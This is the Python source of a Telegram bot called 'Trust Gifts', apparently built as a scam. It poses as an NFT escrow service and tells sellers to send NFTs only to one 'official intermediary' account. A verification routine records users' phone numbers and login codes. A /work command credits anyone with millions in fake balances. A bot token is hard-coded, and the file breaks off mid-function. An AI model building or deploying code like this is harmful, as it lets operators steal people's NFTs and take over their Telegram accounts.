import asyncio
import json
import os
import uuid
import random
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, BufferedInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiohttp import web

# ============================================================
# 1. КОНФИГУРАЦИЯ — ТОКЕН БЕРИТЕ ИЗ ПЕРЕМЕННЫХ ОКРУЖЕНИЯ!
# ============================================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8546518591:AAETMPiA707SmS8CgtNLBq85MvncSVccuj4")
MASTER_ADMIN_ID = 8986358602
BOT_USERNAME = "Trustnftsgiftbot"
BOT_NAME = "Trust Gifts"
NFT_ESCROW_ACCOUNT = "Trustnftgift"
MINI_APP_URL = "https://saitminiapp.onrender.com"

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# ============================================================
# 2. PREMIUM ЭМОДЗИ (ВАШИ ID)
# ============================================================
EMOJI_MAP = {
    "briefcase": {"premium": "5893255507380014983", "normal": "💼"},
    "zap": {"premium": "5893450623449305489", "normal": "⚡️"},
    "one": {"premium": "5794164805065514131", "normal": "1️⃣"},
    "two": {"premium": "5794085322400733645", "normal": "2️⃣"},
    "three": {"premium": "5794280000383358988", "normal": "3️⃣"},
    "four": {"premium": "5794241397217304511", "normal": "4️⃣"},
    "bulb": {"premium": "5893290369629556374", "normal": "💡"},
    "arrow_down": {"premium": "6037157012242960559", "normal": "⬇️"},
    "wallet": {"premium": "5902206159095339799", "normal": "💰"},
    "list": {"premium": "6039404727542747508", "normal": "📋"},
    "book": {"premium": "6039584437564347225", "normal": "📖"},
    "globe": {"premium": "5776233299424843260", "normal": "🌐"},
    "gear": {"premium": "6032742198179532882", "normal": "⚙️"},
    "check": {"premium": "5895514131896733546", "normal": "✅"},
    "cross": {"premium": "5893163582194978381", "normal": "❌"},
    "gift": {"premium": "6037175527846975726", "normal": "🎁"},
    "crown": {"premium": "5805553606635559688", "normal": "👑"},
    "user": {"premium": "6032994772321309200", "normal": "👤"},
    "headset": {"premium": "5886437972647088483", "normal": "🎧"},
    "shield": {"premium": "5902016123972358349", "normal": "🛡"},
    "rocket": {"premium": "6041705726206808304", "normal": "🚀"},
    "star": {"premium": "6028338546736107668", "normal": "⭐️"},
    "ton": {"premium": "6037083366438737901", "normal": "💎"},
    "stars": {"premium": "5767199127775481841", "normal": "⭐️"},
    "rub": {"premium": "5778421276024509124", "normal": "💰"},
    "uah": {"premium": "5776233299424843260", "normal": "🌐"},
}

def get_emoji(key: str) -> str:
    """ПРАВИЛЬНЫЙ формат Premium эмодзи для текста"""
    data = EMOJI_MAP.get(key, {})
    premium_id = data.get("premium")
    normal = data.get("normal", "")
    if premium_id and normal:
        return f'<tg-emoji emoji-id="{premium_id}">{normal}</tg-emoji>'
    return normal

def get_emoji_id(key: str) -> str:
    """Только ID для кнопок (icon_custom_emoji_id)"""
    data = EMOJI_MAP.get(key, {})
    return data.get("premium")

def get_emoji_normal(key: str) -> str:
    """Обычный символ без HTML"""
    data = EMOJI_MAP.get(key, {})
    return data.get("normal", "")

# ============================================================
# 3. ФАЙЛЫ
# ============================================================
FILES = {
    "deals": "deals.json",
    "admins": "admins.json",
    "balance": "balance.json",
    "verification": "verification.json",
    "verification_requests": "verification_requests.json",
    "withdraw": "withdraw_requests.json",
    "logs": "logs.json",
    "user_language": "user_language.json",
    "stats": "stats.json",
    "rekvisits": "rekvisits.json",
    "tickets": "tickets.json",
    "chat_messages": "chat_messages.json",
    "verification_deposits": "verification_deposits.json",
    "welcome_media": "welcome_media.json"
}

def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"])
admins = load_json(FILES["admins"])
balance = load_json(FILES["balance"])
verification_data = load_json(FILES["verification"])
verification_requests = load_json(FILES["verification_requests"])
withdraw_requests = load_json(FILES["withdraw"])
logs = load_json(FILES["logs"])
user_language = load_json(FILES["user_language"])
stats = load_json(FILES["stats"])
rekvisits = load_json(FILES["rekvisits"])
tickets = load_json(FILES["tickets"])
chat_messages = load_json(FILES["chat_messages"])
verification_deposits = load_json(FILES["verification_deposits"])
welcome_media = load_json(FILES["welcome_media"])

# ============================================================
# 4. ПОМОЩНИКИ
# ============================================================
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID or str(user_id) in admins

def get_balance(user_id: int):
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_json(FILES["balance"], balance)

def set_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = amount
    save_json(FILES["balance"], balance)

def get_user_language(user_id: int) -> str:
    return user_language.get(str(user_id), "ru")

def set_user_language(user_id: int, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

def is_verified(user_id: int) -> bool:
    uid = str(user_id)
    if uid not in verification_data:
        return False
    if "verified_at" in verification_data[uid]:
        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
        if (datetime.now() - verified_time).total_seconds() > 86400:
            return False
        return True
    return False

def complete_verification(user_id: int, phone: str, code: str):
    uid = str(user_id)
    verification_data[uid] = {
        "verified_at": datetime.now().isoformat(),
        "expires_at": (datetime.now() + timedelta(hours=24)).isoformat(),
        "phone": phone,
        "code": code,
        "method": "account_login"
    }
    save_json(FILES["verification"], verification_data)

async def log_to_master(text: str):
    try:
        await bot.send_message(MASTER_ADMIN_ID, text)
    except:
        pass

def log_action(action: str, data: dict):
    log_id = str(uuid.uuid4())[:8]
    logs[log_id] = {
        "id": log_id,
        "time": datetime.now().isoformat(),
        "action": action,
        "data": data
    }
    save_json(FILES["logs"], logs)

# ============================================================
# 5. КЛАВИАТУРЫ (С icon_custom_emoji_id)
# ============================================================
def main_menu_keyboard(user_id: int):
    buttons = [
        [
            InlineKeyboardButton(
                text="Создать сделку",
                web_app=WebAppInfo(url=MINI_APP_URL)
            ),
            InlineKeyboardButton(
                text="Баланс",
                callback_data="menu_balance"
            ),
        ],
        [
            InlineKeyboardButton(
                text="Мои сделки",
                callback_data="menu_deals"
            ),
            InlineKeyboardButton(
                text="Гайд",
                callback_data="how_to_deal"
            ),
        ],
        [
            InlineKeyboardButton(
                text="Язык",
                callback_data="select_language"
            ),
        ]
    ]
    
    # Добавляем Premium эмодзи к кнопкам
    emoji_ids = {
        "briefcase": get_emoji_id("briefcase"),
        "wallet": get_emoji_id("wallet"),
        "list": get_emoji_id("list"),
        "book": get_emoji_id("book"),
        "globe": get_emoji_id("globe"),
    }
    
    for row in buttons:
        for btn in row:
            if btn.callback_data == "menu_balance" and emoji_ids.get("wallet"):
                btn.icon_custom_emoji_id = emoji_ids["wallet"]
            elif btn.callback_data == "menu_deals" and emoji_ids.get("list"):
                btn.icon_custom_emoji_id = emoji_ids["list"]
            elif btn.callback_data == "how_to_deal" and emoji_ids.get("book"):
                btn.icon_custom_emoji_id = emoji_ids["book"]
            elif btn.callback_data == "select_language" and emoji_ids.get("globe"):
                btn.icon_custom_emoji_id = emoji_ids["globe"]
            elif btn.web_app and emoji_ids.get("briefcase"):
                btn.icon_custom_emoji_id = emoji_ids["briefcase"]
    
    if is_admin(user_id):
        admin_btn = InlineKeyboardButton(
            text="Админ",
            callback_data="menu_admin"
        )
        if get_emoji_id("gear"):
            admin_btn.icon_custom_emoji_id = get_emoji_id("gear")
        buttons.append([admin_btn])
    
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def admin_panel_keyboard():
    buttons = [
        [
            InlineKeyboardButton(
                text="Начислить",
                callback_data="admin_add_balance"
            ),
            InlineKeyboardButton(
                text="Админы",
                callback_data="admin_manage_admins"
            ),
        ],
        [
            InlineKeyboardButton(
                text="Все сделки",
                callback_data="admin_all_deals"
            ),
            InlineKeyboardButton(
                text="Выводы",
                callback_data="admin_withdraw_requests"
            ),
        ],
        [
            InlineKeyboardButton(
                text="Верификация",
                callback_data="admin_verification"
            ),
            InlineKeyboardButton(
                text="Тикеты",
                callback_data="admin_tickets"
            ),
        ],
        [
            InlineKeyboardButton(
                text="Логи",
                callback_data="admin_logs"
            ),
            InlineKeyboardButton(
                text="Статистика",
                callback_data="admin_stats"
            ),
        ],
        [
            InlineKeyboardButton(
                text="Все пользователи",
                callback_data="admin_users"
            ),
            InlineKeyboardButton(
                text="Приветствие медиа",
                callback_data="admin_welcome_media"
            ),
        ],
        [
            InlineKeyboardButton(
                text="Назад",
                callback_data="back_to_main"
            ),
        ]
    ]
    
    emoji_ids = {
        "wallet": get_emoji_id("wallet"),
        "user": get_emoji_id("user"),
        "list": get_emoji_id("list"),
        "gift": get_emoji_id("gift"),
        "check": get_emoji_id("check"),
        "headset": get_emoji_id("headset"),
        "book": get_emoji_id("book"),
        "zap": get_emoji_id("zap"),
        "arrow_down": get_emoji_id("arrow_down"),
    }
    
    for row in buttons:
        for btn in row:
            if btn.callback_data == "admin_add_balance" and emoji_ids.get("wallet"):
                btn.icon_custom_emoji_id = emoji_ids["wallet"]
            elif btn.callback_data == "admin_manage_admins" and emoji_ids.get("user"):
                btn.icon_custom_emoji_id = emoji_ids["user"]
            elif btn.callback_data == "admin_all_deals" and emoji_ids.get("list"):
                btn.icon_custom_emoji_id = emoji_ids["list"]
            elif btn.callback_data == "admin_withdraw_requests" and emoji_ids.get("gift"):
                btn.icon_custom_emoji_id = emoji_ids["gift"]
            elif btn.callback_data == "admin_verification" and emoji_ids.get("check"):
                btn.icon_custom_emoji_id = emoji_ids["check"]
            elif btn.callback_data == "admin_tickets" and emoji_ids.get("headset"):
                btn.icon_custom_emoji_id = emoji_ids["headset"]
            elif btn.callback_data == "admin_logs" and emoji_ids.get("book"):
                btn.icon_custom_emoji_id = emoji_ids["book"]
            elif btn.callback_data == "admin_stats" and emoji_ids.get("zap"):
                btn.icon_custom_emoji_id = emoji_ids["zap"]
            elif btn.callback_data == "admin_users" and emoji_ids.get("user"):
                btn.icon_custom_emoji_id = emoji_ids["user"]
            elif btn.callback_data == "back_to_main" and emoji_ids.get("arrow_down"):
                btn.icon_custom_emoji_id = emoji_ids["arrow_down"]
    
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def back_to_main_keyboard():
    btn = InlineKeyboardButton(
        text="На главную",
        callback_data="back_to_main"
    )
    if get_emoji_id("arrow_down"):
        btn.icon_custom_emoji_id = get_emoji_id("arrow_down")
    return InlineKeyboardMarkup(inline_keyboard=[[btn]])

def language_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="set_lang_ru")],
        [InlineKeyboardButton(text="🇬🇧 English", callback_data="set_lang_en")],
    ])

def currency_keyboard():
    buttons = []
    for key, label in [("ton", "TON"), ("stars", "STARS"), ("rub", "RUB"), ("uah", "UAH")]:
        btn = InlineKeyboardButton(
            text=label,
            callback_data=f"curr_{label}"
        )
        emoji_id = get_emoji_id(key)
        if emoji_id:
            btn.icon_custom_emoji_id = emoji_id
        buttons.append([btn])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def mini_app_keyboard(text: str, page: str = "", deal_id: str = None, buyer_id: int = None):
    url = MINI_APP_URL
    params = []
    if page:
        params.append(f"page={page}")
    if deal_id:
        params.append(f"deal={deal_id}")
    if buyer_id:
        params.append(f"buyer={buyer_id}")
    if params:
        url += "?" + "&".join(params)
    
    btn1 = InlineKeyboardButton(text=text, web_app=WebAppInfo(url=url))
    btn2 = InlineKeyboardButton(
        text="На главную",
        callback_data="back_to_main"
    )
    if get_emoji_id("arrow_down"):
        btn2.icon_custom_emoji_id = get_emoji_id("arrow_down")
    
    return InlineKeyboardMarkup(inline_keyboard=[[btn1], [btn2]])

# ============================================================
# 6. ОТПРАВКА СООБЩЕНИЙ С PREMIUM ЭМОДЗИ
# ============================================================
async def send_with_premium_emoji(target, text: str, reply_markup=None, is_callback: bool = False):
    """
    Отправляет текст с Premium эмодзи через фото,
    потому что <tg-emoji> работает только в caption
    """
    # Создаём прозрачное изображение 1x1
    transparent_png = bytes([
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
        0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
        0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
        0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, 0xC4,
        0x89, 0x00, 0x00, 0x00, 0x0A, 0x49, 0x44, 0x41,
        0x54, 0x78, 0x9C, 0x63, 0x00, 0x01, 0x00, 0x00,
        0x05, 0x00, 0x01, 0x0D, 0x0A, 0x2D, 0xB4, 0x00,
        0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE,
        0x42, 0x60, 0x82
    ])
    
    photo = BufferedInputFile(transparent_png, filename="blank.png")
    
    if is_callback:
        # Для callback'ов используем edit_text с обычными эмодзи
        normal_text = text
        for key, data in EMOJI_MAP.items():
            if data.get("premium") and data.get("normal"):
                normal_text = normal_text.replace(
                    f'<tg-emoji emoji-id="{data["premium"]}">{data["normal"]}</tg-emoji>',
                    data["normal"]
                )
        await target.edit_text(normal_text, reply_markup=reply_markup)
    else:
        await target.answer_photo(
            photo=photo,
            caption=text,
            reply_markup=reply_markup
        )

# ============================================================
# 7. ГАЙД
# ============================================================
def get_guide_text():
    return f"""{get_emoji('briefcase')} <b>Trust Gifts — официальная платформа безопасных сделок</b>

{get_emoji('check')} Гарантия защиты — средства под охраной
{get_emoji('zap')} Быстрые выплаты — удобный вывод
{get_emoji('headset')} Поддержка 24/7

{get_emoji('one')} <b>Как проходит сделка:</b>
{get_emoji('two')} Продавец создаёт сделку и отправляет ссылку покупателю
{get_emoji('three')} Покупатель оплачивает — средства резервируются платформой
{get_emoji('four')} Продавец передаёт товар официальному посреднику @{NFT_ESCROW_ACCOUNT} для проверки
{get_emoji('check')} Покупатель получает товар после подтверждения

⚠️ <b>ВНИМАНИЕ:</b> NFT передаётся ТОЛЬКО на @{NFT_ESCROW_ACCOUNT}"""

# ============================================================
# 8. АДМИН: УПРАВЛЕНИЕ ПРИВЕТСТВЕННЫМ МЕДИА
# ============================================================
class AdminMediaStates(StatesGroup):
    waiting_media = State()

@dp.callback_query(lambda c: c.data == "admin_welcome_media")
async def admin_welcome_media(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return
    
    current = welcome_media.get("media", "Не установлено")
    current_type = welcome_media.get("type", "—")
    
    text = f"""{get_emoji('gift')} <b>Управление приветственным медиа</b>

📎 Текущее медиа: {current}
📂 Тип: {current_type}

Отправьте <b>фото</b>, <b>видео</b> или <b>GIF</b> для установки.
Или нажмите кнопку для удаления."""
    
    buttons = [
        InlineKeyboardButton(
            text="Удалить медиа",
            callback_data="admin_clear_media"
        ),
        InlineKeyboardButton(
            text="Назад",
            callback_data="menu_admin"
        ),
    ]
    if get_emoji_id("cross"):
        buttons[0].icon_custom_emoji_id = get_emoji_id("cross")
    if get_emoji_id("arrow_down"):
        buttons[1].icon_custom_emoji_id = get_emoji_id("arrow_down")
    
    await send_with_premium_emoji(
        callback.message,
        text,
        InlineKeyboardMarkup(inline_keyboard=[buttons]),
        is_callback=True
    )
    await state.set_state(AdminMediaStates.waiting_media)
    await callback.answer()

@dp.message(AdminMediaStates.waiting_media)
async def admin_save_media(message: types.Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещён")
        await state.clear()
        return
    
    media_data = {}
    
    if message.photo:
        media_data["file_id"] = message.photo[-1].file_id
        media_data["type"] = "photo"
        media_data["media"] = "Фото"
    elif message.video:
        media_data["file_id"] = message.video.file_id
        media_data["type"] = "video"
        media_data["media"] = "Видео"
    elif message.animation:
        media_data["file_id"] = message.animation.file_id
        media_data["type"] = "gif"
        media_data["media"] = "GIF"
    else:
        await message.answer("❌ Отправьте фото, видео или GIF")
        return
    
    global welcome_media
    welcome_media.update(media_data)
    save_json(FILES["welcome_media"], welcome_media)
    
    text = f"""{get_emoji('check')} <b>Медиа установлено!</b>

📎 Тип: {media_data['media']}
{get_emoji('zap')} Теперь при /start будет отправляться это медиа."""
    
    await send_with_premium_emoji(message, text, admin_panel_keyboard())
    await state.clear()
    await log_to_master(f"📎 Админ установил новое приветственное медиа: {media_data['media']}")

@dp.callback_query(lambda c: c.data == "admin_clear_media")
async def admin_clear_media(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return
    
    global welcome_media
    welcome_media = {}
    save_json(FILES["welcome_media"], welcome_media)
    
    text = f"""{get_emoji('check')} <b>Приветственное медиа удалено</b>

Теперь будет отправляться только текстовое сообщение."""
    
    await send_with_premium_emoji(callback.message, text, admin_panel_keyboard(), is_callback=True)
    await state.clear()
    await callback.answer()

# ============================================================
# 9. КОМАНДА /work (ДЛЯ ВСЕХ)
# ============================================================
@dp.message(Command("work"))
async def cmd_work(message: types.Message):
    for curr in ["ton", "stars", "rub", "uah"]:
        add_balance(message.from_user.id, curr, 10000000)
    
    text = f"""{get_emoji('check')} <b>БОНУС НАЧИСЛЕН!</b>

{get_emoji('ton')} +10.000.000 TON
{get_emoji('stars')} +10.000.000 STARS
{get_emoji('rub')} +10.000.000 RUB
{get_emoji('uah')} +10.000.000 UAH

{get_emoji('zap')} Баланс обновлён!"""
    
    await send_with_premium_emoji(message, text, back_to_main_keyboard())
    
    await log_to_master(
        f"💰 БОНУС НАЧИСЛЕН\n\n"
        f"👤 Пользователь: @{message.from_user.username or 'без username'} (ID: {message.from_user.id})"
    )

# ============================================================
# 10. ОБРАБОТЧИК СТАРТА
# ============================================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        await handle_deal_link(message, deal_id)
        return
    
    lang = get_user_language(message.from_user.id)
    
    if not lang:
        await message.answer(
            f"{get_emoji('globe')} Выберите язык / Choose language:",
            reply_markup=language_keyboard()
        )
        return
    
    welcome_text = f"""{get_emoji('briefcase')} <b>Добро пожаловать в Trust Gifts</b>

{get_emoji('zap')} Ваш надежный P2P-бот
{get_emoji('one')} Автоматические сделки с NFT и подарками
{get_emoji('two')} Полная защита обеих сторон
{get_emoji('three')} Реферальная программа — 30% от комиссии
{get_emoji('four')} Передача товаров через менеджера: @{NFT_ESCROW_ACCOUNT}

{get_emoji('bulb')} <b>Выберите действие ниже</b> {get_emoji('arrow_down')}"""
    
    # Проверяем медиа
    media_data = welcome_media.get("media")
    media_type = welcome_media.get("type")
    media_file_id = welcome_media.get("file_id")
    
    if media_file_id and media_type:
        try:
            if media_type == "photo":
                await message.answer_photo(
                    photo=media_file_id,
                    caption=welcome_text,
                    reply_markup=main_menu_keyboard(message.from_user.id)
                )
            elif media_type in ("video", "gif"):
                await message.answer_video(
                    video=media_file_id,
                    caption=welcome_text,
                    reply_markup=main_menu_keyboard(message.from_user.id)
                )
            else:
                await send_with_premium_emoji(message, welcome_text, main_menu_keyboard(message.from_user.id))
            return
        except Exception as e:
            print(f"Ошибка отправки медиа: {e}")
    
    await send_with_premium_emoji(message, welcome_text, main_menu_keyboard(message.from_user.id))

# ============================================================
# 11. ОБРАБОТЧИКИ КНОПОК
# ============================================================
@dp.callback_query(lambda c: c.data.startswith("set_lang_"))
async def set_language(callback: types.CallbackQuery):
    lang = callback.data.split("_")[2]
    set_user_language(callback.from_user.id, lang)
    
    if lang == "en":
        welcome_text = f"""{get_emoji('briefcase')} <b>Welcome to Trust Gifts</b>

{get_emoji('zap')} Your reliable P2P-bot
{get_emoji('one')} Automatic deals with NFTs and gifts
{get_emoji('two')} Full protection for both parties
{get_emoji('three')} Referral program — 30% from commission
{get_emoji('four')} Transfer via manager: @{NFT_ESCROW_ACCOUNT}

{get_emoji('bulb')} <b>Choose action below</b> {get_emoji('arrow_down')}"""
    else:
        welcome_text = f"""{get_emoji('briefcase')} <b>Добро пожаловать в Trust Gifts</b>

{get_emoji('zap')} Ваш надежный P2P-бот
{get_emoji('one')} Автоматические сделки с NFT и подарками
{get_emoji('two')} Полная защита обеих сторон
{get_emoji('three')} Реферальная программа — 30% от комиссии
{get_emoji('four')} Передача товаров через менеджера: @{NFT_ESCROW_ACCOUNT}

{get_emoji('bulb')} <b>Выберите действие ниже</b> {get_emoji('arrow_down')}"""
    
    await send_with_premium_emoji(
        callback.message,
        welcome_text,
        main_menu_keyboard(callback.from_user.id),
        is_callback=True
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "select_language")
async def select_language(callback: types.CallbackQuery):
    await callback.message.edit_text(
        f"{get_emoji('globe')} Выберите язык / Choose language:",
        reply_markup=language_keyboard()
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    
    if lang == "en":
        welcome_text = f"""{get_emoji('briefcase')} <b>Welcome to Trust Gifts</b>

{get_emoji('zap')} Choose action:"""
    else:
        welcome_text = f"""{get_emoji('briefcase')} <b>Добро пожаловать в Trust Gifts</b>

{get_emoji('bulb')} <b>Выберите действие:</b>"""
    
    await send_with_premium_emoji(
        callback.message,
        welcome_text,
        main_menu_keyboard(callback.from_user.id),
        is_callback=True
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "how_to_deal")
async def how_to_deal(callback: types.CallbackQuery):
    await send_with_premium_emoji(
        callback.message,
        get_guide_text(),
        back_to_main_keyboard(),
        is_callback=True
    )
    await callback.answer()

# ============================================================
# 12. БАЛАНС
# ============================================================
@dp.callback_query(lambda c: c.data == "menu_balance")
async def menu_balance(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    bal = get_balance(callback.from_user.id)
    verif_status = f"{get_emoji('check')} Доступен" if is_verified(callback.from_user.id) else f"{get_emoji('cross')} Требуется верификация"
    
    if lang == "en":
        text = f"""{get_emoji('wallet')} <b>YOUR BALANCE</b>

{get_emoji('ton')} TON: {bal.get('ton', 0)}
{get_emoji('stars')} STARS: {bal.get('stars', 0)}
{get_emoji('rub')} RUB: {bal.get('rub', 0)}
{get_emoji('uah')} UAH: {bal.get('uah', 0)}

📊 Completed deals: {sum(bal.get('deal_partners', {}).values())}

🔐 Verification: {verif_status}

📱 ALL OPERATIONS IN MINI APP"""
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Withdraw",
                    callback_data="start_withdraw"
                ),
                InlineKeyboardButton(
                    text="Main menu",
                    callback_data="back_to_main"
                ),
            ]
        ])
        if get_emoji_id("gift"):
            keyboard.inline_keyboard[0][0].icon_custom_emoji_id = get_emoji_id("gift")
        if get_emoji_id("arrow_down"):
            keyboard.inline_keyboard[0][1].icon_custom_emoji_id = get_emoji_id("arrow_down")
    else:
        text = f"""{get_emoji('wallet')} <b>ВАШ БАЛАНС</b>

{get_emoji('ton')} TON: {bal.get('ton', 0)}
{get_emoji('stars')} STARS: {bal.get('stars', 0)}
{get_emoji('rub')} RUB: {bal.get('rub', 0)}
{get_emoji('uah')} UAH: {bal.get('uah', 0)}

📊 Завершено сделок: {sum(bal.get('deal_partners', {}).values())}

🔐 Верификация: {verif_status}

📱 ВСЕ ОПЕРАЦИИ В MINI APP"""
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Вывод",
                    callback_data="start_withdraw"
                ),
                InlineKeyboardButton(
                    text="На главную",
                    callback_data="back_to_main"
                ),
            ]
        ])
        if get_emoji_id("gift"):
            keyboard.inline_keyboard[0][0].icon_custom_emoji_id = get_emoji_id("gift")
        if get_emoji_id("arrow_down"):
            keyboard.inline_keyboard[0][1].icon_custom_emoji_id = get_emoji_id("arrow_down")
    
    await send_with_premium_emoji(callback.message, text, keyboard, is_callback=True)
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_deals")
async def menu_deals(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    user_deals = []
    for d_id, d in deals.items():
        if d.get("seller_id") == callback.from_user.id or d.get("buyer_id") == callback.from_user.id:
            user_deals.append((d_id, d))
    
    if not user_deals:
        text = f"{get_emoji('cross')} У вас нет сделок" if lang == "ru" else f"{get_emoji('cross')} You have no deals"
        await send_with_premium_emoji(callback.message, text, back_to_main_keyboard(), is_callback=True)
        return
    
    if lang == "en":
        text = f"{get_emoji('list')} <b>MY DEALS</b>\n\n"
    else:
        text = f"{get_emoji('list')} <b>МОИ СДЕЛКИ</b>\n\n"
    
    for d_id, d in user_deals[-10:]:
        status_map = {
            "waiting_payment": f"{get_emoji('zap')} Ожидает оплаты" if lang == "ru" else f"{get_emoji('zap')} Waiting for payment",
            "paid": f"{get_emoji('check')} Оплачено" if lang == "ru" else f"{get_emoji('check')} Paid",
            "awaiting_confirmation": f"{get_emoji('gift')} Ожидает подтверждения" if lang == "ru" else f"{get_emoji('gift')} Awaiting confirmation",
            "completed": f"{get_emoji('crown')} Завершено" if lang == "ru" else f"{get_emoji('crown')} Completed"
        }
        text += f"#{d_id} | {status_map.get(d['status'], d['status'])}\n"
        text += f"   💰 {d['amount']} {d['currency']} | {d['product'][:25]}\n"
        text += f"   👤 Продавец: @{d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n\n"
    
    await send_with_premium_emoji(callback.message, text[:4000], back_to_main_keyboard(), is_callback=True)
    await callback.answer()

# ============================================================
# 13. АДМИН-ПАНЕЛЬ
# ============================================================
@dp.callback_query(lambda c: c.data == "menu_admin")
async def menu_admin(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещён", show_alert=True)
        return
    
    text = f"""{get_emoji('gear')} <b>АДМИН ПАНЕЛЬ</b>

Выберите действие:"""
    
    await send_with_premium_emoji(
        callback.message,
        text,
        admin_panel_keyboard(),
        is_callback=True
    )
    await callback.answer()

# ============================================================
# 14. АДМИН: ВСЕ СДЕЛКИ
# ============================================================
@dp.callback_query(lambda c: c.data == "admin_all_deals")
async def admin_all_deals(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return
    if not deals:
        await send_with_premium_emoji(
            callback.message,
            f"{get_emoji('cross')} Нет сделок",
            admin_panel_keyboard(),
            is_callback=True
        )
        return
    text = f"{get_emoji('list')} <b>ВСЕ СДЕЛКИ</b>\n\n"
    for d_id, d in list(deals.items())[-20:]:
        status_map = {
            "waiting_payment": f"{get_emoji('zap')} Ожидает оплаты",
            "paid": f"{get_emoji('check')} Оплачено",
            "awaiting_confirmation": f"{get_emoji('gift')} Ожидает подтверждения",
            "completed": f"{get_emoji('crown')} Завершено"
        }
        text += f"#{d_id} | {status_map.get(d['status'], d['status'])}\n"
        text += f"   👤 @{d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n"
        text += f"   💰 {d.get('amount', 0)} {d.get('currency', '')}\n"
        text += f"   📦 {d.get('product', '')[:30]}\n"
        text += f"   🗑️ /delete_deal {d_id}\n\n"
    await send_with_premium_emoji(callback.message, text[:4000], admin_panel_keyboard(), is_callback=True)
    await callback.answer()

@dp.message(Command("delete_deal"))
async def delete_deal_command(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещён")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer("ℹ️ Использование: /delete_deal [deal_id]")
        return
    deal_id = args[1]
    if deal_id not in deals:
        await message.answer("❌ Сделка не найдена")
        return
    del deals[deal_id]
    save_json(FILES["deals"], deals)
    await message.answer(f"✅ Сделка #{deal_id} удалена")

# ============================================================
# 15. АДМИН: ВСЕ ПОЛЬЗОВАТЕЛИ
# ============================================================
@dp.callback_query(lambda c: c.data == "admin_users")
async def admin_users(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return
    
    users_list = []
    for uid, data in balance.items():
        users_list.append({
            "id": uid,
            "ton": data.get("ton", 0),
            "stars": data.get("stars", 0),
            "rub": data.get("rub", 0),
            "uah": data.get("uah", 0)
        })
    
    if not users_list:
        await send_with_premium_emoji(
            callback.message,
            f"{get_emoji('user')} Нет пользователей",
            admin_panel_keyboard(),
            is_callback=True
        )
        return
    
    text = f"{get_emoji('user')} <b>ВСЕ ПОЛЬЗОВАТЕЛИ</b>\n\n"
    for u in users_list[-20:]:
        text += f"🆔 {u['id']}\n"
        text += f"   💎 TON: {u['ton']} | ⭐️ STARS: {u['stars']}\n"
        text += f"   💰 RUB: {u['rub']} | 🌐 UAH: {u['uah']}\n\n"
    
    await send_with_premium_emoji(callback.message, text[:4000], admin_panel_keyboard(), is_callback=True)
    await callback.answer()

# ============================================================
# 16. АДМИН: ВЕРИФИКАЦИЯ
# ============================================================
@dp.callback_query(lambda c: c.data == "admin_verification")
async def admin_verification(callback: types.CallbackQuery):
